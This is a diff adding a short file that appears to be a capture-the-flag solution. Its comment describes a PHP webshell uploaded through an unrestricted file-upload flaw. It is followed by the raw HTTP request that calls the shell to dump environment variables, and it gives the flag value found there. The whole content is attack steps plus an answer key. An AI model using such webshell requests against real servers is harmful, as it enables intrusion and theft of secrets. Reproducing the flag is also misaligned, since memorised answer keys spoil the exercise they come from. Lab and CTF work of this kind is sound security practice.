@@ -1,0 +1,4 @@
+# PHP webshell uploaded via unrestricted file upload. GET this URL to execute PHP and read environment variables including FLAG=flag{dc97f359-f228-492b-b344-038f3d712a73}
+
+GET /upload/envshell.php HTTP/1.1
+Host: 172.17.0.1:42411
